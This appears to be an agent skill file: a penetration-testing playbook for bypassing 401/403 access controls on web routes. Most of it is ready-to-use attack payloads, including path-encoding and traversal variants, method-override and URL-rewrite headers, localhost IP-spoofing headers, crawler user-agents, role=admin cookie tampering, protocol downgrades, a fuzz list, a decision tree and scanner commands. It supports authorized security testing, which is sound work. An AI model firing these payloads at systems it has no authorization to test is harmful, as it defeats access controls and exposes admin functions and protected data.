---
name: 401-403-bypass-techniques
description: Use when protected HTTP routes return 401 or 403. Covers path, method, header, protocol, UA/host, query/fragment, and calibration workflow.
version: 1.1.0
revision_date: 2026-09-21
license: MIT
platforms: [linux]
compatibility: Requires curl; nomore403 or byp4xx is optional.
metadata:
  tags: [recon, authorization, http, access-control, path-normalization]
  category: recon
  related_skills:
    - hunt-auth-bypass
    - hunt-http-smuggling
    - hunt-ssrf
    - hunt-idor
---

# 401/403 Bypass Techniques

A bypass candidate appears when two HTTP-processing layers (CDN, reverse proxy,
web server, framework) decide differently about the same request. The useful
signal is a change in routing or protected content, not a status code alone.

## When to Use

- A known route returns `401 Unauthorized` or `403 Forbidden`.
- A reverse proxy, WAF, API gateway, or CDN sits in front of the application.
- Frontend and backend normalize paths, methods, or headers differently.
- IIS, Tomcat, Spring, Apache, Nginx, or WebDAV routing is visible.
- Equivalent requests return different status, headers, or body, hinting at a routing differential.

## Prerequisites

- An HTTP client that preserves raw paths: `curl --path-as-is` or Burp Repeater.
- A denied baseline request plus a marker for the expected protected content.
- Optional tooling: `byp4xx`, `dirsearch`, `feroxbuster`, Burp Intruder, `nghttp`, `nc`.

## How to Run

```bash
TARGET="https://target.example"
PATH_DENIED="/admin"
OUTDIR="${OUTPUT_DIR:-./output}/401-403"
mkdir -p "$OUTDIR"

# Denied baseline: record status, headers, and body for comparison.
curl -sS --path-as-is --max-time 10 \
  -D "$OUTDIR/baseline.headers" -o "$OUTDIR/baseline.body" \
  -w 'status=%{http_code} bytes=%{size_download} redirect=%{redirect_url}\n' \
  "$TARGET$PATH_DENIED"

# Calibration: random 404 path learns default error shape to filter false positives.
curl -sS --path-as-is --max-time 10 \
  -D "$OUTDIR/calib404.headers" -o "$OUTDIR/calib404.body" \
  -w 'status=%{http_code} bytes=%{size_download}\n' \
  "$TARGET/no-such-$(date +%s)"

# Compare candidates against the baseline AND the 404 shape.
curl -sS --path-as-is --max-time 10 -i "$TARGET/./${PATH_DENIED#/}"
curl -sS --path-as-is --max-time 10 -i -X OPTIONS "$TARGET$PATH_DENIED"
curl -sS --path-as-is --max-time 10 -i -H 'X-Forwarded-For: 127.0.0.1' "$TARGET$PATH_DENIED"
```

For each candidate, compare status, `Location`, body length, title, and a
protected-content marker against the baseline.

## Procedure

### 1. Path Manipulation Bypasses

The core idea: the reverse proxy/WAF checks one path format, but the backend
normalizes differently. The `✓` marks request forms that commonly reach the
backend through a different route; a `200` alone is not proof of access (see
Verification).

#### 1.1 Trailing Slash / Missing Slash

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

#### 1.2 Case Sensitivity

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

Works when: proxy rule is case-sensitive but backend is case-insensitive
(common on Windows/IIS).

#### 1.3 URL Encoding

```
/admin          → 403
/%61dmin        → 200  ✓ (encode 'a')
/admi%6e        → 200  ✓ (encode 'n')
/%61%64%6d%69%6e → 200  ✓ (full encode)
```

#### 1.4 Double URL Encoding

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓
```

#### 1.5 Unicode / UTF-8 Encoding

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
/admi%C0%6E     → 200  ✓ (overlong UTF-8 for 'n')
/%C0%AFadmin    → 200  ✓ (overlong UTF-8 for '/')
```

Modern UTF-8 decoders reject overlong forms; these target legacy parsers and
mixed decoding chains.

#### 1.6 Dot-Segment / Path Traversal

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat path parameter)
```

#### 1.7 Null Byte

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓
```

Relevant to older native modules; modern managed runtimes usually reject
embedded NUL bytes.

#### 1.8 Path Parameter Injection

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
/admin;         → 200  ✓
/admin;x        → 200  ✓
```

#### 1.9 Trailing Special Characters

```
/admin%20 (space)  /admin%09 (tab)   /admin%0a (LF)   /admin%0d (CR)
/admin%23 (#)      /admin%3f (?)     /admin%26 (&)    /admin%25 (%)
/admin? (empty query)  /admin??  /admin/??/  /admin?id=1  /admin?& 
/admin#  /admin/#/  /admin#/./  /admin*  /admin//*  /admin~  /admin/~
/admin.json  /admin/.json  /admin.css  /admin.html  /admin.php~  /admin.bak  /admin.old
/admin-  /admin&  /admin°/  /admin\/\/
```

Each encoded suffix also worth trying with trailing slash: `/admin%2f/`, `/admin%20/`, `/admin%09/`, `/admin%0d/`.
Works when: proxy does string-match on `/admin` but backend strips query/fragment/params or ignores unknown suffix.

#### 1.10 Backslash (Windows/IIS)

```
/admin\    /admin\..\/    \..\admin
```

#### 1.11 Combined Path Tricks

```
///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
/%2e/admin/   /%20/admin/%20/   /*/admin   /*/admin/   /ADM+IN (+ = space on some stacks)
/%ef%bc%8fadmin (fullwidth unicode slash)  /%u0061dmin (IIS unicode)  /admin..%3B/
```

#### 1.12 Jhaddix 77 Quick-Fuzz List (efficient order)

Highest hit-rate first; append each with and without trailing `/`:
`/?`, `/??`, `/??/`, `/..`, `/../`, `/./`, `/.//`, `//`, `///`, `/.;/`, `/;/`, `//;//`, `/..;/`, `/..%3b/`, `/%2e/`, `/%2f/`, `/%20/`, `/%09/`, `/%0a/`, `/%0d/`, `/%23/`, `/%26/`, `/%3f/`, `/#/./`, `/*`, `/~`, `.json`, `.css`, `.html`, `%00`.

### 2. HTTP Method Bypass

#### 2.1 Direct Method Change

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (may leak allowed methods)
TRACE /admin → 200  ✓ (may reflect headers — XST)
HEAD /admin → 200  ✓ (bodyless response; does not by itself confirm access to the protected body)
```

#### 2.2 Method Override Headers

When the proxy blocks by method, but the backend reads override headers:

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

GET /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
X-HTTP-Method-Override: PATCH
_method=PUT  (in POST body — Rails, Laravel)
```

#### 2.3 Custom / Invalid Methods

```
FOOBAR /admin HTTP/1.1     → some ACLs only check GET/POST
GETS /admin HTTP/1.1       → typo-like methods may bypass
CONNECT /admin HTTP/1.1    → proxy may tunnel
PROPFIND /admin HTTP/1.1   → WebDAV method
MOVE /admin HTTP/1.1       → WebDAV method
```

### 3. Header-Based Bypass

#### 3.1 URL Rewrite Headers (Reverse Proxy / IIS ARR)

These headers tell the backend the "real" URL, bypassing proxy-level path
checks:

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin

GET / HTTP/1.1
X-Override-URL: /admin
```

The proxy sees `GET /` (allowed), but the backend routes to `/admin`. Also try `X-Original-URL: /` while requesting `/admin` directly (reverse direction works on some stacks).

#### 3.2 IP Spoofing Headers (Whitelist Bypass)

Headers to try (each with values `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`):

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
X-Forwarded-Host: localhost | X-Forwarded-Scheme: http | X-Forwarded-Port: 80
Forwarded: for=127.0.0.1;host=localhost;proto=http
```

IP encoding variants: `0177.0.0.1` (octal), `2130706433` (decimal),
`0x7f000001` (hex), `localhost`

#### 3.3 Other Header Tricks

```http
Referer: https://target.com/admin     # Referrer check bypass
Origin: https://target.com             # Origin check bypass
Host: localhost                         # Host header manipulation
Host: 127.0.0.1                         # Host as IP (some ACLs trust it)
Host: target.com:80                     # Explicit port changes match
X-Forwarded-Host: localhost            # Forwarded host
Content-Type: application/json         # Content-type switch
X-Requested-With: XMLHttpRequest       # AJAX flag
```

#### 3.4 User-Agent / Bot / Host / Absolute-URI Bypass

```http
User-Agent: Googlebot                   # allowlist for crawlers
User-Agent: Bingbot
User-Agent: Mozilla/5.0 (iPhone; Mobile)  # mobile UA (proxies often allow mobile)
Host: localhost
GET https://target.com/admin HTTP/1.1  # absolute URI confuses proxy vs origin
GET //admin HTTP/1.1
```

Try IP-vs-host swap: `http://127.0.0.1/admin` vs `http://target.com/admin`, http downgrade on https-only ACLs, and `X-Forwarded-Scheme: http` to flip scheme checks.

#### 3.5 Cookie / Parameter Tampering

```
?isAdmin=true  ?admin=true  ?role=admin  ?view=public (vs restricted)
Remove blocking param entirely. Flip `false→true`, `0→1`, `user→admin`.
Cookie: role=user → role=admin ; session copy from low-priv to path.
```
Only counts if server trusts client-side values; verify by reaching protected behavior, not just 200.

### 4. Protocol Version Bypass

```http
# HTTP/1.0 (some ACLs only apply to HTTP/1.1)
GET /admin HTTP/1.0

# HTTP/0.9 (extremely legacy — no headers)
GET /admin

# HTTP/2 pseudo-header tricks
:method: GET
:path: /admin
:authority: target.com
# See the hunt-http-smuggling skill for H2-specific bypasses, including h2c upgrade.
```

### 5. Verb Tampering + Path Combination

Combine multiple techniques for higher success rate:

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP spoof + path encoding
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # protocol + case + IP spoof
X-Forwarded-For: 127.0.0.1
```

### 6. Technology-Specific Bypasses

| Server | Key Tricks |
|---|---|
| **Apache** | `/admin/` (trailing slash), `/.admin` (dot prefix), `/admin%0d` (CR) |
| **Nginx** | `/Admin` (case), `/admin../` (normalization), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css` (path param+ext), `/admin\` (backslash), `/admin::$DATA` (ADS), `/admin%20` |
| **Tomcat/Java** | `/admin;foo` (path param), `/admin..;/` (traversal), `/;/admin` (empty param) |
| **Spring** | `/admin.anything` (suffix matching, older), `/admin/` (trailing slash) |

### 7. Automated Tools

| Tool | Purpose | URL |
|---|---|---|
| **nomore403** | Modern baseline+calibration scanner (headers++ coverage) | github.com/devploit/nomore403 |
| **byp4xx** | Comprehensive 403 bypass scanner | github.com/lobuhi/byp4xx |
| **Bypass-403** | Go script quick fuzz | github bypass-403 |
| **403 Bypasser** | Burp extension (Gil Nothmann) — one-click path variants | portswigger BApp store |
| **dirsearch** | Directory brute-force with encoding variants | github.com/maurosoria/dirsearch |
| **feroxbuster** | Recursive content discovery | github.com/epi052/feroxbuster |
| **Burp Intruder** | Custom payload lists for manual testing | portswigger.net |

#### nomore403 usage (recommended first for efficiency)

```bash
# Auto-calibrates 404 shape, filters false positives, scores likely bypasses.
nomore403 -u https://target.com/admin -m GET
# Add headers/methods sweep:
nomore403 -u https://target.com/admin -m POST --headers --proxy http://127.0.0.1:8080
# Read LIKELY BYPASS first, then INTERESTING VARIATIONS; replay curl it prints.
```

#### byp4xx usage

```bash
# Basic usage: attempts path, method, header, and protocol variants.
byp4xx -m 10 --rate 5 -xD "https://target.com/admin"

# Output shows all attempted bypasses and their response codes.
# Treat 200/301/302 rows as candidates; confirm each against the baseline.
```

### 8. Decision Tree

```
Got 401 or 403 on a path?
│
├── Try PATH MANIPULATION first (highest success rate)
│   ├── /path/      (trailing slash)
│   ├── /PATH       (case change)
│   ├── /path%20    (trailing space)
│   ├── /./path     (dot segment)
│   ├── //path      (double slash)
│   ├── /path;x     (path parameter — Java/Tomcat)
│   ├── /path..;/   (Tomcat specific)
│   ├── /%2e/path   (encoded dot)
│   ├── /path%00    (null byte)
│   ├── /path%23    (encoded hash)
│   └── Result? → status/body differ from baseline = candidate
│
├── Path tricks failed → Try METHOD BYPASS
│   ├── POST/PUT/PATCH/DELETE/OPTIONS
│   ├── HEAD (bodyless GET — verify body access separately)
│   ├── X-HTTP-Method-Override: PUT
│   └── TRACE (may reflect auth headers — XST)
│
├── Method tricks failed → Try HEADER BYPASS
│   ├── X-Original-URL: /path      (reverse proxy/IIS rewrite)
│   ├── X-Rewrite-URL: /path       (same concept)
│   ├── X-Override-URL: /path      (variant)
│   ├── X-Forwarded-For: 127.0.0.1 (IP whitelist)
│   ├── X-Real-IP: 127.0.0.1
│   ├── True-Client-IP: 127.0.0.1
│   ├── X-Forwarded-Host/Scheme/Port sweep
│   ├── User-Agent: Googlebot / mobile UA
│   ├── Host: localhost / absolute-URI GET https://host/path
│   └── Referer: https://target.com/path
│
├── Header tricks failed → Try PROTOCOL BYPASS
│   ├── HTTP/1.0 instead of 1.1
│   ├── HTTP/2 h2c smuggling (hunt-http-smuggling)
│   └── WebSocket upgrade
│
├── Single techniques failed → Try COMBINATIONS
│   ├── Method + Path: POST /PATH/
│   ├── Header + Path: X-Forwarded-For + /path%20
│   ├── All three: POST + X-Original-URL + IP headers
│   └── Protocol + Path: HTTP/1.0 + encoded path
│
├── All bypasses failed → Consider ALTERNATIVE APPROACHES
│   ├── Request smuggling (hunt-http-smuggling) → smuggle past ACL
│   ├── SSRF (hunt-ssrf) → access from server
│   ├── IDOR (hunt-idor) → access data directly
│   └── Auth flaws (hunt-auth-bypass) → login bypass
│
└── Automated scan with nomore403 (preferred) or byp4xx for completeness
```

## Quick Reference — Key Payloads

```http
# Top 15 quick-wins (try these first)
GET /admin/     HTTP/1.1        # trailing slash
GET /Admin      HTTP/1.1        # case change
GET /admin%20   HTTP/1.1        # trailing space
GET /./admin    HTTP/1.1        # dot segment
GET //admin     HTTP/1.1        # double slash
GET /%2e/admin  HTTP/1.1        # encoded dot prefix
GET /admin?     HTTP/1.1        # empty query
GET /admin#     HTTP/1.1        # fragment
GET /admin.json HTTP/1.1        # extension (Spring/Ruby)
POST /admin     HTTP/1.1        # method change
GET / HTTP/1.1                  # X-Original-URL bypass
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP whitelist bypass
X-Forwarded-For: 127.0.0.1
GET /admin HTTP/1.1             # bot UA bypass
User-Agent: Googlebot
GET /admin;.css HTTP/1.1        # IIS path param
GET /admin..;/ HTTP/1.1         # Tomcat bypass
```

## Pitfalls

- A `200` may be a login page, generic error, WAF challenge, SPA shell, or cached public response.
- A `301`/`302` may only redirect to authentication; inspect `Location` and the destination body.
- `HEAD` has no body; `OPTIONS` and `TRACE` expose method behavior, not the protected content.
- CDN, proxy, server, framework, and application layers may each normalize differently; identify the layer responsible for a change.
- Browsers and CLI clients normalize URLs differently; use `--path-as-is`.
- Some clients and servers collapse `//` and dot-segments before any check runs, so a candidate can hit the wire as the plain baseline path; confirm the raw request target (Burp Repeater shows what was actually sent).
- Legacy parser forms only work where a compatible parser exists.
- Cache hits can make distinct requests look identical or a candidate look successful without reaching the protected handler.

## Verification

- Compare every candidate with BOTH denied baseline and random-404 calibration: status, reason phrase, `Location`, `WWW-Authenticate`, `Allow`, cache and content-type headers, title, body length, and protected-content markers.
- If candidate matches 404 shape, it's routing difference, not bypass. If it matches baseline shape with different status only, keep testing.
- Repeat with a cache buster (`?cb=<rand>`) when cache behavior is ambiguous.
- A bypass is confirmed when the candidate reaches protected content or behavior the baseline cannot reach; a status change alone is an observation, not a bypass.
